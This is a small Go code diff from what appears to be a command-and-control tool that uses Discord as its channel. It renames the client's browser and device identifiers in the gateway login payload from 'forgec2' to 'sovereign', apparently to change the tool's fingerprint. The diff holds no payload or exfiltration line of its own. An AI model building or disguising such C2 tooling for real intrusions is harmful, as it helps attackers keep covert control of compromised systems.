@@ -166,8 +166,8 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 			"intents": 513,
 			"properties": map[string]interface{}{
 				"os":      "windows",
-				"browser": "forgec2",
-				"device":  "forgec2",
+				"browser": "sovereign",
+				"device":  "sovereign",
 			},
 		},
 	}
